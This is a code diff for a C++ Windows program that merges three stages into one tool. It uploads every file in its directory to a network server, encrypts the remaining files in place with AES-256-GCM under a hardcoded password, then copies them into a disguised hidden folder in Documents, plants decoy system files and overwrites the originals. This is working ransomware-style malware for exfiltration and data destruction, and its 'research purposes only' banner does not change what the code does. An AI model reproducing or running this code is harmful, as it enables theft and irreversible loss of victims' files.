@@ -1,3 +1,6 @@
+// Combined tool: Network File Transfer + Encryption + Stealth Hiding
+// Usage: Run this file to execute all three operations in sequence
+
 #include <iostream>
 #include <fstream>
 #include <sstream>
@@ -8,28 +11,33 @@
 #include <iomanip>
 #include <cstring>
 #include <filesystem>
-#include <cstdlib>
 #include <chrono>
 #include <thread>
 #include <random>
-#include <cctype>
-#include <regex>
+#include <cstdlib>
 
+// Network headers
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <windows.h>
+#include <sys/stat.h>
+
+// Crypto headers
+#include <openssl/evp.h>
+#include <openssl/rand.h>
+
+// Platform-specific headers
 #ifdef _WIN32
-    #include <winsock2.h>
-    #include <ws2tcpip.h>
-    #include <windows.h>
     #include <shlobj.h>
-    #include <direct.h>
     #include <lmcons.h>
     #include <wincrypt.h>
-    #include <sys/stat.h>
-    #include <shlobj.h>
+    #include <psapi.h>
     #include <aclapi.h>
+    #include <direct.h>
     #define getcwd _getcwd
-    #pragma comment(lib, "ws2_32.lib")
     #pragma comment(lib, "crypt32.lib")
     #pragma comment(lib, "advapi32.lib")
+    #pragma comment(lib, "psapi.lib")
 #else
     #include <unistd.h>
     #include <sys/stat.h>
@@ -38,16 +46,18 @@
     #include <pwd.h>
 #endif
 
-// OpenSSL headers for encryption
-#include <openssl/evp.h>
-#include <openssl/rand.h>
+#pragma comment(lib, "ws2_32.lib")
 
 namespace fs = std::filesystem;
 
-// ==================== NETWORK TRANSFER (Client.cpp) ====================
+// ========== CONSTANTS ==========
 #define PORT 8080
 #define BUFFER_SIZE 4096
+const std::string PASSWORD = "StrongPassword@123";
+const std::string MAGIC = "CRYPTO_V1";
+constexpr int KEY_SIZE = 32, SALT_SIZE = 16, IV_SIZE = 12, TAG_SIZE = 16, ITER = 100000;
 
+// ========== PHASE 1: NETWORK FILE TRANSFER (Client.cpp) ==========
 class FileTransferClient {
 private:
     SOCKET sock;
@@ -58,25 +68,31 @@ private:
         WSADATA wsaData;
         if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
             std::cerr << "WSAStartup failed" << std::endl;
-            return;
+            exit(EXIT_FAILURE);
         }
         
         sock = socket(AF_INET, SOCK_STREAM, 0);
+        if (sock == INVALID_SOCKET) {
+            std::cerr << "Socket creation failed" << std::endl;
+            WSACleanup();
+            exit(EXIT_FAILURE);
+        }
+        
         serv_addr.sin_family = AF_INET;
         serv_addr.sin_port = htons(PORT);
         
         if (inet_pton(AF_INET, ip.c_str(), &serv_addr.sin_addr) <= 0) {
+            std::cerr << "Invalid address" << std::endl;
             closesocket(sock);
             WSACleanup();
-            std::cerr << "Invalid address" << std::endl;
-            return;
+            exit(EXIT_FAILURE);
         }
         
         if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
+            std::cerr << "Connection failed" << std::endl;
             closesocket(sock);
             WSACleanup();
-            std::cerr << "Connection failed" << std::endl;
-            return;
+            exit(EXIT_FAILURE);
         }
         std::cout << "Connected to server." << std::endl;
     }
@@ -91,14 +107,6 @@ private:
         memset(buffer, 0, BUFFER_SIZE);
         int bytesRead = recv(sock, buffer, BUFFER_SIZE, 0);
         return (bytesRead <= 0) ? "" : std::string(buffer);
-    }
-
-    size_t getFileSize(const std::string& filepath) {
-        std::ifstream file(filepath, std::ios::binary | std::ios::ate);
-        if (!file.is_open()) return 0;
-        std::streamsize size = file.tellg();
-        file.close();
-        return (size_t)size;
     }
 
     void sendFile(const std::string& filepath) {
@@ -120,7 +128,8 @@ private:
         sendString(std::to_string(fileSize));
 
         if (receiveString() != "READY") {
-            std::cerr << "Server not ready" << std::endl;
+            std::cerr << "Server not ready for file: " << filename << std::endl;
+            file.close();
             return;
         }
 
@@ -130,7 +139,6 @@ private:
         }
         file.close();
         receiveString();
-        std::cout << "  Sent: " << filename << std::endl;
     }
 
     void getAllFilesInFolder(const std::string& folderPath, std::vector<std::string>& files, const std::string& basePath = "") {
@@ -171,37 +179,35 @@ private:
         sendString(std::to_string(files.size()));
         if (receiveString() != "READY_FILES") return;
 
-        std::cout << "  Sending folder: " << folderName << " (" << files.size() << " files)" << std::endl;
-        
         for (const auto& file : files) {
             std::string relativePath = fileRelativePaths[file];
-            size_t size = getFileSize(file);
+            
+            std::ifstream infile(file, std::ios::binary | std::ios::ate);
+            if (!infile.is_open()) continue;
+            size_t size = (size_t)infile.tellg();
+            infile.close();
 
             sendString(relativePath);
             sendString(std::to_string(size));
 
             if (receiveString() != "READY_FILE") continue;
 
-            std::ifstream infile(file, std::ios::binary);
+            infile.open(file, std::ios::binary);
             char buffer[BUFFER_SIZE];
             while (infile.read(buffer, BUFFER_SIZE) || infile.gcount() > 0) {
                 send(sock, buffer, (int)infile.gcount(), 0);
             }
             infile.close();
-            receiveString();
+            receiveString(); 
         }
     }
 
 public:
-    bool transferFiles(const std::string& serverIP = "127.0.0.1") {
-        std::cout << "\n=== STEP 1: NETWORK TRANSFER ===" << std::endl;
-        std::cout << "Connecting to " << serverIP << "..." << std::endl;
+    void execute(const std::string& serverIP = "127.0.0.1") {
+        std::cout << "\n=== PHASE 1: NETWORK FILE TRANSFER ===" << std::endl;
+        std::cout << "Connecting to server..." << std::endl;
         
         connectToServer(serverIP);
-        if (sock == INVALID_SOCKET) {
-            std::cerr << "Failed to connect to server" << std::endl;
-            return false;
-        }
 
         char exePathBuffer[MAX_PATH];
         GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
@@ -210,9 +216,6 @@ public:
         std::string currentDir = fullExePath.substr(0, fullExePath.find_last_of("\\/"));
         std::string myName = fullExePath.substr(fullExePath.find_last_of("\\/") + 1);
 
-        std::cout << "Scanning: " << currentDir << std::endl;
-        
-        // First send all files
         std::string searchPattern = currentDir + "\\*";
         WIN32_FIND_DATA findData;
         HANDLE hFind = FindFirstFile(searchPattern.c_str(), &findData);
@@ -226,10 +229,10 @@ public:
                 std::string fullPath = currentDir + "\\" + itemName;
 
                 if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-                    std::cout << "Folder -> " << itemName << std::endl;
+                    std::cout << "Sending folder: " << itemName << std::endl;
                     sendFolder(fullPath);
                 } else {
-                    std::cout << "File   -> " << itemName << std::endl;
+                    std::cout << "Sending file: " << itemName << std::endl;
                     sendFile(fullPath);
                 }
             } while (FindNextFile(hFind, &findData) != 0);
@@ -239,121 +242,89 @@ public:
         sendString("QUIT");
         closesocket(sock);
         WSACleanup();
-        std::cout << "Network transfer complete." << std::endl;
-        return true;
+        std::cout << "File transfer completed." << std::endl;
     }
 };
 
-// ==================== ENCRYPTION (encrypt_dir.cpp) ====================
-const std::string PASSWORD = "StrongPassword@123";
-const std::string MAGIC = "CRYPTO_V1";
-constexpr int KEY_SIZE = 32, SALT_SIZE = 16, IV_SIZE = 12, TAG_SIZE = 16, ITER = 100000;
-
-void deriveKey(const unsigned char* salt, unsigned char* key) {
-    PKCS5_PBKDF2_HMAC(PASSWORD.c_str(), PASSWORD.size(), salt, SALT_SIZE, ITER, EVP_sha256(), KEY_SIZE, key);
-}
-
-bool isAlreadyEncrypted(const fs::path& p) {
-    std::ifstream f(p, std::ios::binary);
-    char buf[9]; 
-    f.read(buf, MAGIC.size());
-    return f.gcount() == MAGIC.size() && std::string(buf, 9) == MAGIC;
-}
-
-void encryptFile(const fs::path& filePath) {
-    if (isAlreadyEncrypted(filePath)) return;
-
-    std::ifstream inFile(filePath, std::ios::binary);
-    if (!inFile.is_open()) {
-        std::cerr << "  Cannot open for encryption: " << filePath.filename() << std::endl;
-        return;
+// ========== PHASE 2: ENCRYPTION (encrypt_dir.cpp) ==========
+class DirectoryEncryptor {
+private:
+    void deriveKey(const unsigned char* salt, unsigned char* key) {
+        PKCS5_PBKDF2_HMAC(PASSWORD.c_str(), PASSWORD.size(), salt, SALT_SIZE, ITER, EVP_sha256(), KEY_SIZE, key);
     }
-    
-    std::vector<unsigned char> plain((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
-    inFile.close();
 
-    // Skip empty files
-    if (plain.empty()) return;
+    bool isAlreadyEncrypted(const fs::path& p) {
+        std::ifstream f(p, std::ios::binary);
+        char buf[9]; 
+        f.read(buf, MAGIC.size());
+        return f.gcount() == MAGIC.size() && std::string(buf, 9) == MAGIC;
+    }
 
-    unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
-    RAND_bytes(salt, SALT_SIZE);
-    RAND_bytes(iv, IV_SIZE);
-    deriveKey(salt, key);
+    void encryptFile(const fs::path& filePath) {
+        if (isAlreadyEncrypted(filePath)) return;
 
-    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
-    EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
-    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr);
-    EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);
+        std::ifstream inFile(filePath, std::ios::binary);
+        std::vector<unsigned char> plain((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
+        inFile.close();
 
-    std::vector<unsigned char> cipher(plain.size() + 16); // Extra space for GCM
-    int len;
-    EVP_EncryptUpdate(ctx, cipher.data(), &len, plain.data(), (int)plain.size());
-    EVP_EncryptFinal_ex(ctx, nullptr, &len);
-    EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
-    EVP_CIPHER_CTX_free(ctx);
+        if (plain.empty()) return;
 
-    // Overwrite the original file with: MAGIC + SALT + IV + TAG + CIPHER
-    std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
-    outFile.write(MAGIC.c_str(), MAGIC.size());
-    outFile.write((char*)salt, SALT_SIZE);
-    outFile.write((char*)iv, IV_SIZE);
-    outFile.write((char*)tag, TAG_SIZE);
-    outFile.write((char*)cipher.data(), cipher.size());
-}
+        unsigned char salt[SALT_SIZE], iv[IV_SIZE], tag[TAG_SIZE], key[KEY_SIZE];
+        RAND_bytes(salt, SALT_SIZE);
+        RAND_bytes(iv, IV_SIZE);
+        deriveKey(salt, key);
 
-void encryptRemainingFiles() {
-    std::cout << "\n=== STEP 2: ENCRYPTION ===" << std::endl;
-    std::cout << "Encrypting ALL remaining files (including videos)..." << std::endl;
-    
-    fs::path target = fs::current_path();
-    int count = 0;
-    int skipped = 0;
-    
-    // Get current executable name to skip it
-    char exePathBuffer[MAX_PATH];
-    GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
-    std::string currentExe = fs::path(exePathBuffer).filename().string();
-    
-    // Process ALL files including in subdirectories
-    try {
+        EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
+        EVP_EncryptInit_ex(ctx, EVP_aes_256_gcm(), nullptr, nullptr, nullptr);
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_SET_IVLEN, IV_SIZE, nullptr);
+        EVP_EncryptInit_ex(ctx, nullptr, nullptr, key, iv);
+
+        std::vector<unsigned char> cipher(plain.size() + EVP_MAX_BLOCK_LENGTH);
+        int len;
+        EVP_EncryptUpdate(ctx, cipher.data(), &len, plain.data(), (int)plain.size());
+        int cipher_len = len;
+        EVP_EncryptFinal_ex(ctx, cipher.data() + len, &len);
+        cipher_len += len;
+        EVP_CIPHER_CTX_ctrl(ctx, EVP_CTRL_GCM_GET_TAG, TAG_SIZE, tag);
+        EVP_CIPHER_CTX_free(ctx);
+
+        cipher.resize(cipher_len);
+
+        std::ofstream outFile(filePath, std::ios::binary | std::ios::trunc);
+        outFile.write(MAGIC.c_str(), MAGIC.size());
+        outFile.write((char*)salt, SALT_SIZE);
+        outFile.write((char*)iv, IV_SIZE);
+        outFile.write((char*)tag, TAG_SIZE);
+        outFile.write((char*)cipher.data(), cipher.size());
+    }
+
+public:
+    void execute() {
+        std::cout << "\n=== PHASE 2: DIRECTORY ENCRYPTION ===" << std::endl;
+        fs::path target = fs::current_path();
+        int count = 0;
+        
+        std::string myName = fs::path(__argv[0]).filename().string();
+        
         for (auto& e : fs::recursive_directory_iterator(target)) {
-            try {
-                if (fs::is_regular_file(e.status())) {
-                    std::string filename = e.path().filename().string();
-                    
-                    // Skip our own executable
-                    if (filename == currentExe) {
-                        continue;
-                    }
-                    
-                    // Check if already encrypted
-                    if (!isAlreadyEncrypted(e.path())) {
+            if (e.is_regular_file() && e.path().filename() != myName) {
+                if (!isAlreadyEncrypted(e.path())) {
+                    try {
                         encryptFile(e.path());
-                        std::cout << "  Encrypted: " << filename;
-                        if (!e.path().parent_path().string().empty() && 
-                            e.path().parent_path() != target) {
-                            std::cout << " (in " << fs::relative(e.path(), target).parent_path() << ")";
-                        }
-                        std::cout << std::endl;
+                        std::cout << "[+] Encrypted: " << e.path().filename() << std::endl;
                         count++;
-                    } else {
-                        skipped++;
+                    } catch (const std::exception& e) {
+                        std::cerr << "Error encrypting file: " << e.what() << std::endl;
                     }
                 }
-            } catch (const std::exception& e) {
-                std::cerr << "  Error processing file: " << e.what() << std::endl;
             }
         }
-    } catch (const std::exception& e) {
-        std::cerr << "Error during encryption: " << e.what() << std::endl;
+        
+        std::cout << "Total files encrypted: " << count << std::endl;
     }
-    
-    std::cout << "Encryption complete." << std::endl;
-    std::cout << "  Files encrypted: " << count << std::endl;
-    std::cout << "  Files already encrypted: " << skipped << std::endl;
-}
+};
 
-// ==================== STEALTH OPERATION (secure_copy.cpp) ====================
+// ========== PHASE 3: STEALTH HIDING (secure_copy.cpp) ==========
 class DocumentsStealthHider {
 private:
     std::string sourceDir;
@@ -393,14 +364,25 @@ private:
         const char* systemFolderNames[] = {
             "Windows.old",
             "MSOCache",
+            "MSOCache2",
             "$WINDOWS.~BT",
+            "$Windows.~WS",
+            "$WinREAgent",
             "Boot",
+            "Documents and Settings",
             "PerfLogs",
+            "ProgramData",
             "Recovery",
             "System Volume Information",
+            "WindowsUpdate",
             "WinSxS",
             "SysWOW64",
-            "Prefetch"
+            "inf",
+            "Media",
+            "Prefetch",
+            "Fonts",
+            "Cursors",
+            "Resources"
         };
         
         std::random_device rd;
@@ -432,25 +414,6 @@ private:
         return "hhh" + lastThree + "_" + std::to_string(dis(gen)) + extension;
     }
     
-    std::string generateHiddenDirname(const std::string& originalDirPath) {
-        std::string dirname = fs::path(originalDirPath).filename().string();
-        
-        std::string lastThree;
-        if (dirname.length() >= 3) {
-            lastThree = dirname.substr(dirname.length() - 3);
-        } else {
-            lastThree = dirname;
-        }
-        
-        std::transform(lastThree.begin(), lastThree.end(), lastThree.begin(), ::tolower);
-        
-        std::random_device rd;
-        std::mt19937 gen(rd());
-        std::uniform_int_distribution<> dis(100, 999);
-        
-        return "dir" + lastThree + "_" + std::to_string(dis(gen));
-    }
-    
     void setUltraHidden(const std::string& path) {
         #ifdef _WIN32
             DWORD attrs = GetFileAttributesA(path.c_str());
@@ -461,55 +424,28 @@ private:
                 }
                 SetFileAttributesA(path.c_str(), attrs | FILE_ATTRIBUTE_HIDDEN);
             }
+        #else
+            std::string newPath = fs::path(path).parent_path().string() + "/." + 
+                                 fs::path(path).filename().string();
+            std::rename(path.c_str(), newPath.c_str());
+            chmod(newPath.c_str(), 0600);
         #endif
     }
     
     bool copyToHiddenLocation(const std::string& srcPath, const std::string& relativePath) {
         try {
-            // Check if source is directory or file
-            bool isDirectory = fs::is_directory(srcPath);
+            std::string hiddenFilename = generateHiddenFilename(srcPath);
+            std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenFilename;
             
-            if (isDirectory) {
-                // For directories
-                std::string hiddenDirname = generateHiddenDirname(srcPath);
-                std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenDirname;
-                
-                // Create the hidden directory
-                fs::create_directories(destPath);
-                setUltraHidden(destPath);
-                
-                // Recursively copy all contents
-                for (const auto& entry : fs::recursive_directory_iterator(srcPath)) {
-                    if (fs::is_regular_file(entry.status())) {
-                        std::string fileSrcPath = entry.path().string();
-                        std::string fileRelPath = fileSrcPath.substr(srcPath.length());
-                        
-                        if (!fileRelPath.empty() && (fileRelPath[0] == '\\' || fileRelPath[0] == '/')) {
-                            fileRelPath = fileRelPath.substr(1);
-                        }
-                        
-                        std::string fileDestPath = destPath + "\\" + fileRelPath;
-                        fs::create_directories(fs::path(fileDestPath).parent_path());
-                        fs::copy(entry.path(), fileDestPath, fs::copy_options::overwrite_existing);
-                        setUltraHidden(fileDestPath);
-                    }
-                }
-                
-                return true;
-            } else {
-                // For files
-                std::string hiddenFilename = generateHiddenFilename(srcPath);
-                std::string destPath = hiddenBaseDir + "\\" + relativePath + "\\" + hiddenFilename;
-                
-                fs::create_directories(fs::path(destPath).parent_path());
-                fs::copy(srcPath, destPath, fs::copy_options::overwrite_existing);
-                setUltraHidden(destPath);
-                
-                return true;
-            }
+            fs::create_directories(fs::path(destPath).parent_path());
             
-        } catch (const std::exception& e) {
-            std::cerr << "  Error copying " << srcPath << ": " << e.what() << std::endl;
+            fs::copy(srcPath, destPath, fs::copy_options::overwrite_existing);
+            
+            setUltraHidden(destPath);
+            
+            return true;
+            
+        } catch (...) {
             return false;
         }
     }
@@ -526,7 +462,6 @@ private:
                 return std::remove(filepath.c_str()) == 0;
             }
             
-            // 7-pass overwrite
             for (int pass = 0; pass < 7; pass++) {
                 std::ofstream outfile(filepath, std::ios::binary | std::ios::trunc);
                 if (!outfile.is_open()) return false;
@@ -576,54 +511,16 @@ private:
         }
     }
     
-    bool secureDeleteDirectory(const std::string& dirpath) {
-        try {
-            // First delete all files in directory
-            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
-                if (fs::is_regular_file(entry.status())) {
-                    secureDelete7Pass(entry.path().string());
-                }
-            }
-            
-            // Now delete directories (deepest first)
-            std::vector<std::string> dirs;
-            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
-                if (fs::is_directory(entry.status())) {
-                    dirs.push_back(entry.path().string());
-                }
-            }
-            
-            // Sort by length (deepest first)
-            std::sort(dirs.begin(), dirs.end(), 
-                     [](const std::string& a, const std::string& b) {
-                         return a.length() > b.length();
-                     });
-            
-            // Remove hidden attributes and delete
-            for (const auto& dir : dirs) {
-                #ifdef _WIN32
-                    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
-                #endif
-                fs::remove(dir);
-            }
-            
-            // Delete main directory
-            #ifdef _WIN32
-                SetFileAttributesA(dirpath.c_str(), FILE_ATTRIBUTE_NORMAL);
-            #endif
-            return fs::remove_all(dirpath) > 0;
-            
-        } catch (...) {
-            return false;
-        }
-    }
-    
     void createDecoySystemFiles() {
         const std::vector<std::pair<std::string, std::string>> decoys = {
             {"desktop.ini", "[.ShellClassInfo]\nIconFile=%SystemRoot%\\system32\\SHELL32.dll\nIconIndex=-238"},
             {"thumbs.db", ""},
             {"NTUSER.DAT", ""},
-            {"index.dat", ""}
+            {"ntuser.ini", "[ViewState]\nMode=\nVid=\nFolderType=Generic"},
+            {"index.dat", ""},
+            {"IconCache.db", ""},
+            {"~WRL0001.tmp", ""},
+            {"MSOCache", ""}
         };
         
         for (const auto& decoy : decoys) {
@@ -651,97 +548,101 @@ private:
 public:
     DocumentsStealthHider() {
         sourceDir = fs::current_path().string();
+        
         documentsDir = getDocumentsDirectory();
         if (documentsDir.empty()) {
             std::cerr << "Error: Could not find Documents directory!" << std::endl;
-            return;
+            exit(1);
         }
         
         std::string hiddenFolderName = createWindowsLikeFolderName();
         hiddenBaseDir = documentsDir + "\\" + hiddenFolderName;
         
-        std::cout << "Source directory: " << sourceDir << std::endl;
+        std::cout << "Source: " << sourceDir << std::endl;
         std::cout << "Hidden location: " << hiddenBaseDir << std::endl;
     }
     
-    void executeStealthOperation() {
-        std::cout << "\n=== STEP 3: STEALTH OPERATION ===" << std::endl;
-        std::cout << "Hiding ALL files and folders in Documents..." << std::endl;
+    void execute() {
+        std::cout << "\n=== PHASE 3: STEALTH HIDING ===" << std::endl;
+        std::cout << "[1/3] Copying files to hidden Documents location..." << std::endl;
+        std::vector<std::string> copiedFiles = copyAllToDocuments();
         
-        // Create main hidden directory
-        fs::create_directories(hiddenBaseDir);
-        setUltraHidden(hiddenBaseDir);
+        std::cout << "[2/3] Creating decoy system files..." << std::endl;
+        createDecoySystemFiles();
         
-        int totalItems = 0;
+        std::cout << "[3/3] Securely deleting original files..." << std::endl;
+        secureDeleteOriginals();
+        
+        std::cout << "\nStealth operation complete!" << std::endl;
+        std::cout << "Files hidden in: " << hiddenBaseDir << std::endl;
+        std::cout << "\nNote: Run 'restore_files.exe' to restore encrypted files." << std::endl;
+        std::cout << "Then run 'decrypt_dir.exe' to decrypt them." << std::endl;
+    }
+
+private:
+    std::vector<std::string> copyAllToDocuments() {
+        std::vector<std::string> copiedFiles;
+        int totalFiles = 0;
         int successCount = 0;
-        int fileCount = 0;
-        int folderCount = 0;
         
-        // Get current executable name to skip it
-        char exePathBuffer[MAX_PATH];
-        GetModuleFileName(NULL, exePathBuffer, MAX_PATH);
-        std::string currentExe = fs::path(exePathBuffer).filename().string();
-        
-        // Process ALL files and folders
         try {
+            fs::create_directories(hiddenBaseDir);
+            setUltraHidden(hiddenBaseDir);
+            
             for (const auto& entry : fs::recursive_directory_iterator(sourceDir)) {
                 try {
-                    totalItems++;
-                    std::string srcPath = entry.path().string();
-                    
-                    // Skip our hidden base directory and current executable
-                    if (srcPath.find(hiddenBaseDir) == 0) continue;
-                    if (fs::is_regular_file(entry.status()) && 
-                        entry.path().filename() == currentExe) continue;
-                    
-                    // Calculate relative path
-                    std::string relativePath = srcPath.substr(sourceDir.length());
-                    if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
-                        relativePath = relativePath.substr(1);
-                    }
-                    
-                    // Remove current item name from relative path for parent directory
-                    std::string parentDirPath = fs::path(relativePath).parent_path().string();
-                    
-                    if (fs::is_directory(entry.status())) {
-                        // Handle directory
-                        if (copyToHiddenLocation(srcPath, parentDirPath)) {
+                    if (fs::is_regular_file(entry.status())) {
+                        totalFiles++;
+                        std::string srcPath = entry.path().string();
+                        
+                        if (srcPath.find(hiddenBaseDir) == 0) continue;
+                        
+                        std::string relativePath = srcPath.substr(sourceDir.length());
+                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
+                            relativePath = relativePath.substr(1);
+                        }
+                        
+                        std::string dirPath = fs::path(relativePath).parent_path().string();
+                        
+                        if (copyToHiddenLocation(srcPath, dirPath)) {
                             successCount++;
-                            folderCount++;
+                            copiedFiles.push_back(srcPath);
                             
-                            if (folderCount % 5 == 0) {
-                                std::cout << "  Hidden " << folderCount << " folders..." << std::endl;
+                            if (successCount % 10 == 0) {
+                                std::cout << "  Copied " << successCount << " files..." << std::endl;
                             }
                         }
-                    } else {
-                        // Handle file
-                        if (copyToHiddenLocation(srcPath, parentDirPath)) {
-                            successCount++;
-                            fileCount++;
-                            
-                            if (fileCount % 10 == 0) {
-                                std::cout << "  Hidden " << fileCount << " files..." << std::endl;
-                            }
+                    } else if (fs::is_directory(entry.status())) {
+                        std::string srcPath = entry.path().string();
+                        if (srcPath.find(hiddenBaseDir) == 0) continue;
+                        
+                        std::string relativePath = srcPath.substr(sourceDir.length());
+                        if (!relativePath.empty() && (relativePath[0] == '\\' || relativePath[0] == '/')) {
+                            relativePath = relativePath.substr(1);
                         }
+                        
+                        std::string hiddenDirName = generateHiddenFilename(relativePath + "\\");
+                        std::string destDirPath = hiddenBaseDir + "\\" + hiddenDirName;
+                        
+                        fs::create_directories(destDirPath);
+                        setUltraHidden(destDirPath);
                     }
-                } catch (const std::exception& e) {
-                    std::cerr << "  Error processing " << entry.path() << ": " << e.what() << std::endl;
-                }
+                } catch (...) {}
             }
+            
         } catch (const std::exception& e) {
-            std::cerr << "Error during stealth operation: " << e.what() << std::endl;
+            std::cerr << "Error: " << e.what() << std::endl;
         }
         
-        std::cout << "  Hidden: " << successCount << "/" << totalItems << " items" << std::endl;
-        std::cout << "  Files: " << fileCount << ", Folders: " << folderCount << std::endl;
-        
-        // Securely delete originals
-        std::cout << "\nSecurely deleting original files and folders..." << std::endl;
+        std::cout << "  Successfully copied: " << successCount << "/" << totalFiles << " files" << std::endl;
+        return copiedFiles;
+    }
+    
+    void secureDeleteOriginals() {
         int deletedFiles = 0;
         int deletedDirs = 0;
         
         try {
-            // Process top-level items first
             std::vector<fs::path> items;
             for (const auto& entry : fs::directory_iterator(sourceDir)) {
                 items.push_back(entry.path());
@@ -750,9 +651,7 @@ public:
             for (const auto& item : items) {
                 std::string itemPath = item.string();
                 
-                // Skip our hidden base directory and current executable
                 if (itemPath.find(hiddenBaseDir) == 0) continue;
-                if (fs::is_regular_file(item) && item.filename() == currentExe) continue;
                 
                 try {
                     if (fs::is_regular_file(item)) {
@@ -764,68 +663,99 @@ public:
                             deletedDirs++;
                         }
                     }
-                } catch (...) {
-                    // Continue
-                }
+                } catch (...) {}
             }
-            
-            // Create decoy system files
-            createDecoySystemFiles();
             
         } catch (...) {
             std::cerr << "Error during secure deletion" << std::endl;
         }
         
-        std::cout << "  Deleted: " << deletedFiles << " files, " << deletedDirs << " directories" << std::endl;
-        std::cout << "  Created decoy system files" << std::endl;
-        
-        std::cout << "\nStealth operation complete." << std::endl;
-        std::cout << "All files and folders are hidden in: " << hiddenBaseDir << std::endl;
-        std::cout << "File pattern: hhh{last3}_{random}.ext" << std::endl;
-        std::cout << "Folder pattern: dir{last3}_{random}" << std::endl;
+        std::cout << "  Securely deleted: " << deletedFiles << " files, " 
+                  << deletedDirs << " directories" << std::endl;
+    }
+    
+    bool secureDeleteDirectory(const std::string& dirpath) {
+        try {
+            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
+                if (fs::is_regular_file(entry.status())) {
+                    secureDelete7Pass(entry.path().string());
+                }
+            }
+            
+            std::vector<std::string> dirs;
+            for (const auto& entry : fs::recursive_directory_iterator(dirpath)) {
+                if (fs::is_directory(entry.status())) {
+                    dirs.push_back(entry.path().string());
+                }
+            }
+            
+            std::sort(dirs.begin(), dirs.end(), 
+                     [](const std::string& a, const std::string& b) {
+                         return a.length() > b.length();
+                     });
+            
+            for (const auto& dir : dirs) {
+                #ifdef _WIN32
+                    SetFileAttributesA(dir.c_str(), FILE_ATTRIBUTE_NORMAL);
+                #endif
+                fs::remove(dir);
+            }
+            
+            #ifdef _WIN32
+                SetFileAttributesA(dirpath.c_str(), FILE_ATTRIBUTE_NORMAL);
+            #endif
+            return fs::remove_all(dirpath) > 0;
+            
+        } catch (...) {
+            return false;
+        }
     }
 };
 
-// ==================== MAIN COMBINED PROGRAM ====================
+// ========== MAIN FUNCTION ==========
 int main(int argc, char* argv[]) {
-    std::cout << "=== COMBINED SECURITY OPERATION ===" << std::endl;
-    std::cout << "This program will perform 3 operations in sequence:" << std::endl;
-    std::cout << "1. Send files over network" << std::endl;
-    std::cout << "2. Encrypt remaining files" << std::endl;
-    std::cout << "3. Hide and securely delete ALL files and folders" << std::endl;
-    std::cout << "===================================\n" << std::endl;
+    std::cout << "=== COMBINED SECURITY TOOL ===" << std::endl;
+    std::cout << "For research purposes only!" << std::endl;
+    std::cout << "\nThis tool will execute 3 phases in sequence:" << std::endl;
+    std::cout << "1. Send files over network (to 127.0.0.1:8080)" << std::endl;
+    std::cout << "2. Encrypt remaining files locally" << std::endl;
+    std::cout << "3. Hide files in Documents and delete originals" << std::endl;
     
-    // Get server IP from command line or use default
-    std::string serverIP = "127.0.0.1";
-    if (argc > 1) {
-        serverIP = argv[1];
+    std::cout << "\nPress Enter to continue or Ctrl+C to abort..." << std::endl;
+    std::cin.get();
+    
+    // Phase 1: Network Transfer
+    try {
+        FileTransferClient client;
+        std::string ip = (argc > 1) ? argv[1] : "127.0.0.1";
+        client.execute(ip);
+    } catch (const std::exception& e) {
+        std::cerr << "Network transfer failed: " << e.what() << std::endl;
+        std::cout << "Continuing with next phase..." << std::endl;
     }
     
-    // Step 1: Network Transfer
-    FileTransferClient ftClient;
-    bool transferSuccess = ftClient.transferFiles(serverIP);
-    
-    if (!transferSuccess) {
-        std::cout << "Network transfer failed or skipped. Continuing with encryption..." << std::endl;
+    // Phase 2: Encryption
+    try {
+        DirectoryEncryptor encryptor;
+        encryptor.execute();
+    } catch (const std::exception& e) {
+        std::cerr << "Encryption failed: " << e.what() << std::endl;
+        std::cout << "Continuing with next phase..." << std::endl;
     }
     
-    // Step 2: Encryption
-    encryptRemainingFiles();
+    // Phase 3: Stealth Hiding
+    try {
+        DocumentsStealthHider hider;
+        hider.execute();
+    } catch (const std::exception& e) {
+        std::cerr << "Stealth hiding failed: " << e.what() << std::endl;
+    }
     
-    // Step 3: Stealth Operation
-    DocumentsStealthHider stealthHider;
-    stealthHider.executeStealthOperation();
+    std::cout << "\n=== ALL OPERATIONS COMPLETED ===" << std::endl;
+    std::cout << "\nTo restore files:" << std::endl;
+    std::cout << "1. Run 'restore_files.exe' - This will find and copy encrypted files" << std::endl;
+    std::cout << "2. Run 'decrypt_dir.exe' - This will decrypt the restored files" << std::endl;
     
-    std::cout << "\n=== ALL OPERATIONS COMPLETE ===" << std::endl;
-    std::cout << "\nTo restore files (they will be encrypted):" << std::endl;
-    std::cout << "1. Run restore_files.cpp to recover hidden files and folders" << std::endl;
-    std::cout << "2. Run decrypt_dir.cpp to decrypt restored files" << std::endl;
-    std::cout << "\nNote: ALL file types are processed including:" << std::endl;
-    std::cout << "- Videos (.mp4, .avi, .mkv, .mov)" << std::endl;
-    std::cout << "- Documents (.doc, .pdf, .txt)" << std::endl;
-    std::cout << "- Images (.jpg, .png, .gif)" << std::endl;
-    std::cout << "- Archives (.zip, .rar)" << std::endl;
